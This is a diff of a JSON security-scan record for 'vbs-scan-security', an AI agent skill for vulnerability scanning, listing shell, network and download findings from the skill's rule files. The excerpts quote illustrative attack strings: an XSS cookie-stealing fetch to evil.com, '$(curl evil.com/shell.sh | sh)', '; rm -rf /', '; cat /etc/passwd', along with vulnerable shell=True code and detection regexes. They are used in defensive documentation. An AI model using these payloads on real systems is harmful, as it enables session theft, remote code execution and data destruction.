@@ -4,24 +4,32 @@
   "repo": "vbsec",
   "path": "skills/antigravity/vbs-scan-security",
   "name": "vbs-scan-security",
-  "description": "",
-  "stars": 323,
+  "description": "Use when scanning code for security vulnerabilities. Use when user says \"scan security\", \"kiểm tra bảo mật\", \"security audit\", \"review security\", or invokes `/vbs-scan-security`. For large scans (>20 main-language files OR >30 total OR >14 days) processes chunks sequentially. Outputs bilingual reports (vi/en). Optional `--auto-fix` (agentic patch + verify loop) and `--sca` (live CVE lookup via OSV.dev).",
+  "stars": 324,
   "category": "security",
   "commit": "1b86c27936d350d1a9ca67f044341262d4219d4e",
   "contentHash": "8c64b22a465e43756f226daad067da25b5f11ad00c05b34db2efec7d81f2348d",
   "repoCreatedAt": "2026-05-13T09:48:49Z",
   "alsoFoundIn": [],
   "status": "ok",
-  "incomplete": true,
-  "scannedAt": "2026-11-07T22:05:48.475Z",
+  "incomplete": false,
+  "scannedAt": "2026-11-09T10:28:36.295Z",
   "scan": {
     "findings": [
+      {
+        "ruleId": "shell",
+        "file": "skills/antigravity/vbs-scan-security/SKILL.md",
+        "line": 104,
+        "excerpt": "ARGS=\"${ARGUMENTS:-$1}\"",
+        "disclosed": true,
+        "automatic": false
+      },
       {
         "ruleId": "network",
         "file": "skills/antigravity/vbs-scan-security/references/dependency-scan.md",
         "line": 30,
         "excerpt": "curl -s -X POST https://api.osv.dev/v1/querybatch \\",
-        "disclosed": false,
+        "disclosed": true,
         "automatic": false,
         "hosts": [
           "api.osv.dev"
@@ -32,21 +40,444 @@
         "file": "skills/antigravity/vbs-scan-security/references/dependency-scan.md",
         "line": 51,
         "excerpt": "curl -s https://api.osv.dev/v1/vulns/GHSA-5crp-9r3c-p9vr",
-        "disclosed": false,
+        "disclosed": true,
         "automatic": false,
         "hosts": [
           "api.osv.dev"
         ]
+      },
+      {
+        "ruleId": "shell",
+        "file": "skills/antigravity/vbs-scan-security/references/i18n/en.md",
+        "line": 121,
+        "excerpt": "| `phrase_no_shell_true` | Do not use `shell=True` with user input |",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "shell",
+        "file": "skills/antigravity/vbs-scan-security/references/i18n/vi.md",
+        "line": 121,
+        "excerpt": "| `phrase_no_shell_true` | Không dùng `shell=True` với user input |",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "shell",
+        "file": "skills/antigravity/vbs-scan-security/references/sub-agent-prompts.md",
+        "line": 48,
+        "excerpt": "21. COMMAND-INJECTION — exec/system/spawn/shell=True with user input",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "downloads-code",
+        "file": "skills/antigravity/vbs-scan-security/references/sub-agent-prompts.md",
+        "line": 145,
+        "excerpt": "| SUPPLY-CHAIN (curl \\| sh no checksum, mutable tag) | `OUTDATED-DEPENDENCY` | \"supply chain risk: unpinned install\" |",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "network",
+        "file": "skills/antigravity/vbs-scan-security/rules/generic/03-xss.md",
+        "line": 11,
+        "excerpt": "User input (L1) được render thẳng vào HTML/DOM mà không escape. Attacker chèn `<script>fetch('//evil.com/?c='+document.cookie)</script>` để **đánh cắp session c",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": []
+      },
+      {
+        "ruleId": "network",
+        "file": "skills/antigravity/vbs-scan-security/rules/generic/05-slopsquatting.md",
+        "line": 13,
+        "excerpt": "Đây là attack mới đặc trưng cho vibe code: research 2024 cho thấy LLM hay invent tên kiểu `requets`, `python-requestz`, `lodahs`, `react-toastr-pro`, `axios-uti",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": []
+      },
+      {
+        "ruleId": "network",
+        "file": "skills/antigravity/vbs-scan-security/rules/generic/05-slopsquatting.md",
+        "line": 37,
+        "excerpt": "- Có giống tên phổ biến không? (Levenshtein distance ≤ 2 với `requests`, `lodash`, `express`, `react`, `axios`, `numpy`, `pandas`...)",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": []
+      },
+      {
+        "ruleId": "network",
+        "file": "skills/antigravity/vbs-scan-security/rules/generic/05-slopsquatting.md",
+        "line": 75,
+        "excerpt": "axios-utils|axios-helpers|axios-pro               # khả nghi",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": []
+      },
+      {
+        "ruleId": "network",
+        "file": "skills/antigravity/vbs-scan-security/rules/generic/05-slopsquatting.md",
+        "line": 132,
+        "excerpt": "\"axios\": \"1.7.2\"",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": []
+      },
+      {
+        "ruleId": "downloads-code",
+        "file": "skills/antigravity/vbs-scan-security/rules/generic/05-slopsquatting.md",
+        "line": 159,
+        "excerpt": "pip install --require-hashes -r requirements.txt",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "network",
+        "file": "skills/antigravity/vbs-scan-security/rules/generic/09-ssrf.md",
+        "line": 17,
+        "excerpt": "- Endpoint gọi `fetch / axios / requests / curl / file_get_contents / HttpClient` với URL từ L1 mà KHÔNG validate host",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": []
+      },
+      {
+        "ruleId": "network",
+        "file": "skills/antigravity/vbs-scan-security/rules/generic/09-ssrf.md",
+        "line": 49,
+        "excerpt": "axios\\.(get|post|put|delete|request)\\s*\\(\\s*req\\.",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": []
+      },
+      {
+        "ruleId": "network",
+        "file": "skills/antigravity/vbs-scan-security/rules/generic/09-ssrf.md",
+        "line": 50,
+        "excerpt": "axios\\.(get|post|put|delete|request)\\s*\\(\\s*[a-zA-Z_]+\\.url",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": []
+      },
+      {
+        "ruleId": "network",
+        "file": "skills/antigravity/vbs-scan-security/rules/generic/09-ssrf.md",
+        "line": 59,
+        "excerpt": "urllib\\.request\\.urlopen\\s*\\(",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": []
+      },
+      {
+        "ruleId": "network",
+        "file": "skills/antigravity/vbs-scan-security/rules/generic/09-ssrf.md",
+        "line": 60,
+        "excerpt": "urlopen\\s*\\(",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": []
+      },
+      {
+        "ruleId": "network",
+        "file": "skills/antigravity/vbs-scan-security/rules/generic/09-ssrf.md",
+        "line": 99,
+        "excerpt": "const r = await fetch(req.body.url);   // L1 → SSRF",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": []
+      },
+      {
+        "ruleId": "network",
+        "file": "skills/antigravity/vbs-scan-security/rules/generic/09-ssrf.md",
+        "line": 110,
+        "excerpt": "r = requests.get(url)",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": []
+      },
+      {
+        "ruleId": "network",
+        "file": "skills/antigravity/vbs-scan-security/rules/generic/09-ssrf.md",
+        "line": 124,
+        "excerpt": "const tokenInfo = await axios.get(req.body.introspect_url);   // attacker control URL",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": []
+      },
+      {
+        "ruleId": "network",
+        "file": "skills/antigravity/vbs-scan-security/rules/generic/09-ssrf.md",
+        "line": 137,
+        "excerpt": "const r = await fetch(u);",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": []
+      },
+      {
+        "ruleId": "network",
+        "file": "skills/antigravity/vbs-scan-security/rules/generic/09-ssrf.md",
+        "line": 165,
+        "excerpt": "await fetch(\"https://api.stripe.com/v1/charges\", { ... });",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": [
+          "api.stripe.com"
+        ]
+      },
+      {
+        "ruleId": "network",
+        "file": "skills/antigravity/vbs-scan-security/rules/generic/09-ssrf.md",
+        "line": 186,
+        "excerpt": "fetch(url, { redirect: \"manual\" });",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": []
+      },
+      {
+        "ruleId": "network",
+        "file": "skills/antigravity/vbs-scan-security/rules/generic/11-csrf.md",
+        "line": 200,
+        "excerpt": "6. **Custom header buộc preflight**: SPA gửi `X-Requested-With: XMLHttpRequest` → CORS preflight → cross-site form không gửi được header này → chặn được CSRF.",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": []
+      },
+      {
+        "ruleId": "network",
+        "file": "skills/antigravity/vbs-scan-security/rules/generic/13-weak-password-hashing.md",
+        "line": 102,
+        "excerpt": "$user = $db->query(\"SELECT * FROM users WHERE email='$email'\")->fetch();",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": []
+      },
+      {
+        "ruleId": "paid-api",
+        "file": "skills/antigravity/vbs-scan-security/rules/generic/18-missing-rate-limit.md",
+        "line": 105,
+        "excerpt": "const OpenAI = require('openai');",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "shell",
+        "file": "skills/antigravity/vbs-scan-security/rules/generic/18-missing-rate-limit.md",
+        "line": 156,
+        "excerpt": "subprocess.run(f\"ping -c 1 {host}\", shell=True)",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "downloads-code",
+        "file": "skills/antigravity/vbs-scan-security/rules/generic/20-outdated-dependency.md",
+        "line": 172,
+        "excerpt": "pip install pip-audit && pip-audit",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "downloads-code",
+        "file": "skills/antigravity/vbs-scan-security/rules/generic/20-outdated-dependency.md",
+        "line": 176,
+        "excerpt": "go install golang.org/x/vuln/cmd/govulncheck@latest",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "downloads-code",
+        "file": "skills/antigravity/vbs-scan-security/rules/generic/20-outdated-dependency.md",
+        "line": 191,
+        "excerpt": "pip install --upgrade requests",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "downloads-code",
+        "file": "skills/antigravity/vbs-scan-security/rules/generic/21-command-injection.md",
+        "line": 11,
+        "excerpt": "Truyền user input vào shell (`bash`, `cmd.exe`) không escape → hacker thêm `; rm -rf /` hoặc `$(curl evil.com/shell.sh | sh)`. Đây là **RCE trực tiếp** — chiếm ",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "shell",
+        "file": "skills/antigravity/vbs-scan-security/rules/generic/21-command-injection.md",
+        "line": 13,
+        "excerpt": "Pattern điển hình: `os.system(\"convert \" + filename + \" out.png\")`. User upload `name \"; cat /etc/passwd; echo \"x\"` → server chạy `cat /etc/passwd`.",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "shell",
+        "file": "skills/antigravity/vbs-scan-security/rules/generic/21-command-injection.md",
+        "line": 15,
+        "excerpt": "Vibe coder hay dùng shell wrapper (`subprocess.run(cmd, shell=True)`, `child_process.exec`) vì \"tiện viết string\" — thay vì truyền argv list (an toàn).",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "shell",
+        "file": "skills/antigravity/vbs-scan-security/rules/generic/21-command-injection.md",
+        "line": 19,
+        "excerpt": "- `os.system`, `subprocess.run(..., shell=True)`, `os.popen` với user input",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "shell",
+        "file": "skills/antigravity/vbs-scan-security/rules/generic/21-command-injection.md",
+        "line": 20,
+        "excerpt": "- Node `child_process.exec(cmd)` (KHÔNG phải `execFile` / `spawn` với arg list)",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "shell",
+        "file": "skills/antigravity/vbs-scan-security/rules/generic/21-command-injection.md",
+        "line": 29,
+        "excerpt": "- Có escape (`shlex.quote`, `escapeshellarg`) nhưng dùng sai (escape arg nhưng vẫn `shell=True` rồi nhúng manually)",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "shell",
+        "file": "skills/antigravity/vbs-scan-security/rules/generic/21-command-injection.md",
+        "line": 43,
+        "excerpt": "4. **shell=False mặc định**: Python `subprocess.run([\"cmd\", arg])` không qua shell — an toàn nếu argv list.",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "shell",
+        "file": "skills/antigravity/vbs-scan-security/rules/generic/21-command-injection.md",
+        "line": 59,
+        "excerpt": "child_process\\.exec\\s*\\(    # exec qua shell",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "shell",
+        "file": "skills/antigravity/vbs-scan-security/rules/generic/21-command-injection.md",
+        "line": 60,
+        "excerpt": "require\\s*\\(\\s*[\"']child_process[\"']\\s*\\)\\.exec",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "shell",
+        "file": "skills/antigravity/vbs-scan-security/rules/generic/21-command-injection.md",
+        "line": 110,
+        "excerpt": "os.system(f\"convert /tmp/{fname} /out/{fname}.png\")",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "shell",
+        "file": "skills/antigravity/vbs-scan-security/rules/generic/21-command-injection.md",
+        "line": 116,
+        "excerpt": "subprocess.run(f\"ffmpeg -i {user_url} out.mp4\", shell=True)",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "shell",
+        "file": "skills/antigravity/vbs-scan-security/rules/generic/21-command-injection.md",
+        "line": 122,
+        "excerpt": "const { exec } = require('child_process');",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "shell",
+        "file": "skills/antigravity/vbs-scan-security/rules/generic/21-command-injection.md",
+        "line": 155,
+        "excerpt": "subprocess.run([\"convert\", user_file, \"out.png\"], check=True)",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "shell",
+        "file": "skills/antigravity/vbs-scan-security/rules/generic/21-command-injection.md",
+        "line": 161,
+        "excerpt": "const { execFile } = require('child_process');",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "shell",
+        "file": "skills/antigravity/vbs-scan-security/rules/generic/21-command-injection.md",
+        "line": 184,
+        "excerpt": "subprocess.run([\"convert\", f\"/tmp/{fname}\", \"out.png\"])",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "shell",
+        "file": "skills/antigravity/vbs-scan-security/rules/generic/21-command-injection.md",
+        "line": 192,
+        "excerpt": "subprocess.run([\"convert\", user_file, out_file], check=True)   # shell=False default",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "downloads-code",
+        "file": "skills/antigravity/vbs-scan-security/rules/generic/22-vulnerable-dependency.md",
+        "line": 82,
+        "excerpt": "pip install <package>==<fixed_version>",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "downloads-code",
+        "file": "skills/antigravity/vbs-scan-security/rules/generic/22-vulnerable-dependency.md",
+        "line": 84,
+        "excerpt": "2. Sau khi bump version, chạy lại restore/install (`dotnet restore`, `npm install`, `go build ./...`, `composer update`, `pip install -r requirements.txt`) để l",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "downloads-code",
+        "file": "skills/antigravity/vbs-scan-security/rules/languages/go/21-command-injection.md",
+        "line": 18,
+        "excerpt": "→ Lúc này args đầu là `sh -c`, **toàn bộ string sau bị shell parse** → attacker chèn `; rm -rf /` hoặc `$(curl evil.com | sh)`.",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "downloads-code",
+        "file": "skills/antigravity/vbs-scan-security/workflows/auto-fix.md",
+        "line": 46,
+        "excerpt": "- Verify cấp dự án (`dotnet build`, `go build ./...`, `npx tsc --noEmit`): chạy 1 lần. Fail → project vốn đã build lỗi, không phân biệt được lỗi do patch hay lỗ",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "downloads-code",
+        "file": "skills/antigravity/vbs-scan-security/workflows/auto-fix.md",
+        "line": 119,
+        "excerpt": "| `typescript` | `npx` + `tsc` trong project (có `tsconfig.json`), else `node` | `npx --no-install tsc --noEmit` nếu có `tsconfig.json`, else `node --check <fil",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "downloads-code",
+        "file": "skills/antigravity/vbs-scan-security/workflows/auto-fix.md",
+        "line": 131,
+        "excerpt": "| PyPI | — | KHÔNG chạy `pip install` (sửa thẳng môi trường Python của user, không hoàn tác được) | Luôn Bước 4 (`suggested_only`) |",
+        "disclosed": false,
+        "automatic": false
       }
     ],
     "findingTotals": {
-      "network": 2
+      "shell": 64,
+      "network": 66,
+      "downloads-code": 12,
+      "paid-api": 1
     },
-    "score": 95,
-    "band": "low",
+    "score": 69,
+    "band": "review",
     "rulesVersion": "1.3.0",
-    "filesScanned": 3,
-    "filesSkipped": 73
+    "filesScanned": 76,
+    "filesSkipped": 0
   },
   "history": [
     {
